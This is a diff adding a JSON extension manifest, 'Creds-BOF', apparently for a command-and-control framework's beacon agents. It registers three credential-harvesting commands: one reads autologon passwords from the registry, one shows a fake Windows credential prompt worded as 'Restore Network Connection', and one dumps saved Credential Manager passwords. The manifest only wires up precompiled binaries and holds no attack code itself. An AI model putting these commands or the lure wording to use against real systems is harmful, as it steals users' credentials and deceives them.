@@ -1,0 +1,41 @@
+{
+    "name": "Creds-BOF",
+    "description": "BOF tools that can be used to harvest passwords",
+    "extensions": [
+        {
+            "type": "command",
+            "agents": ["beacon"],
+
+            "command": "autologon",
+            "description": "Checks the registry for autologon information",
+            "message": "BOF implementation: autologon",
+            "example": "autologon",
+            "exec": "execute bof $EXT_DIR()/_bin/autologon.x64.o"
+        },
+        {
+            "type": "command",
+            "agents": ["beacon"],
+
+            "command": "askcreds",
+            "description": "Prompt for credentials",
+            "message": "BOF implementation: askcreds",
+            "example": "askcreds ",
+            "args": [
+                "STRING <-p prompt> (Restore Network Connection)",
+                "STRING <-n note> (Please verify your Windows user credentials to proceed)",
+                "INT <-t wait_time> (30)"
+            ],
+            "exec": "execute bof $EXT_DIR()/_bin/askcreds.$ARCH().o $PACK_BOF(WSTR {prompt}, WSTR {note}, INT {wait_time})"
+        },
+        {
+            "type": "command",
+            "agents": ["beacon"],
+
+            "command": "credman",
+            "description": "Checks the current user's Windows Credential Manager for saved web passwords",
+            "message": "BOF implementation: credman",
+            "example": "credman ",
+            "exec": "execute bof $EXT_DIR()/_bin/credman.x64.o"
+        }
+    ]
+}
